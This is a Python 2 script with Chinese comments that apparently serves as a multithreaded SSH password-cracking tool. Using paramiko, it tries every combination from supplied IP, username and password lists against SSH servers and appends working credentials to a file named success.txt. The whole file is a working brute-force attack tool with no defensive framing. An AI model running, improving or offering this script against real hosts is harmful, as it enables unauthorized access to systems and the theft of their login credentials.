#!/usr/bin/python
# -*- coding: UTF-8 -*-
from test.test_sax import start
try:
    import paramiko
except Exception,es:
    print "[>] 没有安装paramiko 请使用 pip install paramiko 安装"
import argparse
import thread
import time

parser = argparse.ArgumentParser()

start = time.time()

#parser.add_argument('-hh', '--host', help=u"主机IP,必输")
parser.add_argument('-p', '--password', help=u"密码",default="password")
parser.add_argument('-P', '--passwordFile', help=u"密码文件路径")
parser.add_argument('-u', '--user', help=u"用户名",default="root")
parser.add_argument('-U', '--UserFile', help=u"用户名文件路径")
parser.add_argument('-H', '--ipfilepath', help=u"ip文件路径")
parser.add_argument('-host', '--hostip', help=u"ip地址",default="127.0.0.1")
parser.add_argument('-port', '--port', help=u"服务器端口 默认 22" , default=22,type=int)
parser.add_argument('-t', '--threads', help=u"线程数 默认10个" , default=10,type=int)
#parser.add_argument('-s', '--sleep', help=u"线程休眠时间 单位:秒  默认0.1秒" , default=0.1,type=int)

listip= []
listuser = []
listpassword = []
args = parser.parse_args()
# 单个密码
password = args.password

# 密码文件路径
passwordFile =  args.passwordFile
# 用户名
user = args.user
# 用户名文件路径
UserFile = args.UserFile
# ip地址文件列表   文件格式  ip:port
ipfilepath = args.ipfilepath
# 单个主机IP
hostip = args.hostip
# 端口 默认22
port = args.port
# 启动线程数  默认10
threads =  args.threads
# 当前线程数
threadCount = 0


# 线程休眠 秒数
#sleep = args.sleep



    
# 读文件    
# 并将文件的的信息整理成list中
def readfile(filepath):
    list = []
    f = open(filepath,'r')
    for lines in f:
        list.append(lines.replace('\n',''))
        
    return list

# 连接SSH
def sshcont(ip,port,username,password):
    global threadCount
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
    username = username.strip()
    password = password.strip()
    intport = 22 # 默认端口22 其实这里没啥用
    ips = ip.split(":")
    # 如果IPS的长度等于2 那么证明 IP的格式是ip:port的格式
    if len(ips) == 2:
        ip = ips[0]
        intport = int(ips[1])
    else:
        intport = int(port)   
    
    try:
        ssh.connect(ip, intport, username, password)
        print u"====================================↓"
        print u'连接成功'
        msg = "[>] "+ip+":"+str(intport)+" user:"+username+" password:"+password
        print ''+msg
        wirtefile('success.txt',msg)
        print u"====================================↑"
    except Exception,es:
        # 如果获取banner的信息有误的话 那么就重新调用一次  
        if "Error reading SSH protocol banner" in str(es):
            dothread(ip, intport, username, password)
        else:
            #wirtefile('error.txt',str(es))
            print u"====================================↓"
            print str(es)
            msg = "[>] "+ip+":"+str(intport)+" user:"+username+" password:"+password
            print msg
            print u'登录失败'
            print u"====================================↑"
        
    finally:
        threadCount = threadCount - 1
        ssh.close()
        
    
# 写文件
# 将破解成功的用户名和密码写入到该文件中
def wirtefile(filepath,msg):
    f = open(filepath,'a+')
    f.write(msg+"\n")
    f.close()
    
# 获取IP地址
if  ipfilepath != None:
    listip = readfile(ipfilepath)
else:
    listip.append(hostip)
# 获取用户名
if UserFile != None:
    listuser = readfile(UserFile)
else:
    listuser.append(user)

# 获取密码
if passwordFile != None:
    listpassword=  readfile(passwordFile)
else:
    listpassword.append(password)




def dothread(ips,port,username,passwords):
    
    global threads
    global threadCount
    if threads > threadCount:
        
        thread.start_new_thread(sshcont,(ips,port,username,passwords))
        threadCount = threadCount + 1
        time.sleep(0.1)
    else:
        time.sleep(0.1)
        dothread(ips,port,username,passwords)
    
    
    
    
    
counts = 0
# 遍历IP
for ips in listip:
    # 遍历用户名
    for username in listuser:
        # 遍历密码
        for passwords in listpassword:
            thread.start_new_thread(sshcont,(ips,port,username,passwords))
            dothread(ips,port,username,passwords)
            threadCount = threadCount + 1
            counts = counts+1
            print counts
            
            
            #ssh(ips,port,username,passwords)
            
end = time.time()
print u'共耗时'
print end - start
print u"秒"
    
